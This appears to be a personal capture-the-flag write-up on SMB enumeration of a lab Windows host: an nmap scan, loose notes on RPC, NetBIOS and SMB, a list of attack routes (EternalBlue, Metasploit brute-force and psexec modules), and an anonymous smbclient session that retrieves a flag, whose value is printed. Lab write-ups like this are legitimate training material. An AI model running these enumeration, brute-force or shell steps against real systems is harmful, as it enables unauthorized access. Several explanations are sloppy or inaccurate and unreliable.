Nmap scanning:

~~~
nmap 10.129.147.30 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 08:26 EDT
Nmap scan report for 10.129.147.30
Host is up (0.59s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowscd 

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-09T16:27:09
|_  start_date: N/A
|_clock-skew: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.27 seconds
~~~


Microsoft windows RPC:
remote procedure call for creating distributed client /sever programs. you can use RPC in **all client/server applications based on Windows operating systems**. It can also be used to create client and server programs for heterogeneous network environments that include such operating systems as Unix and Apple

heterogeneous network:
this is the network where the devices are made by  different manufactures or the computers runs with different operating system.
homogeneos network:
this is computer network comprised of computers using similar configuration  and protocols

NetBIOS is a service which allows communication between applications suchn as a printer or other computer in ether etc..


SMB stands for Server Message Block, which is a network protocol used for file sharing, printer sharing, and communication between devices in a network
smb exploit ways :
Eternal Blue 
it is the windows exploit created by US national agency.it exploits a vuln in microsoft implementation of the server message blocker 
SMB login via brute force

Psexec to connect SMB 
psexec is same as the telnet protocol PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software
Rundll32 one-liner to exploit smb

>>bruteforce the smb by this exploit auxiliary/scanner/smb/smb_login
>>get the shell by this exploit exploit/windows/smb/psexec
>>

smb exploit via Ntlm capture



smbclient is used to share files from windows to linux and backups from windows 
using smbclient

 >>..smbclient -N -L \\\\10.129.147.30\\  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.147.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

>>smbclient -N \\\\10.129.147.30\\ADMIN$
tree connect failed: NT_STATUS_ACCESS_DENIED

>>smbclient -N \\\\10.129.147.30\\IPC$  
Try "help" to get a list of possible commands.
smb: \> whoami
whoami: command not found
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> bye
bye: command not found
smb: \> exit


>>smbclient -N \\\\10.129.147.30\\WorkShares
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ld
ld: command not found
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1752194 blocks available
smb: \> dir
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1752194 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
\  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

                5114111 blocks of size 4096. 1752194 blocks available
smb: \Amy.J\> \cat worknotes.txt
\cat: command not found
smb: \Amy.J\> open worknotes.txt
open file \Amy.J\worknotes.txt: for read/write fnum 1
smb: \Amy.J\> open worknotes.txt read
open file \Amy.J\worknotes.txt: for read/write fnum 2
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> James.P
James.P: command not found
smb: \> cd James.P
smb: \James.P\> dir
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1752178 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> 

>>smbclient -N \\\\10.129.147.30\\C$        
tree connect failed: NT_STATUS_ACCESS_DENIED

~~~
flag:5f61c10dffbc77a704d76016a22f1664
~~~


finally get the flag using smb










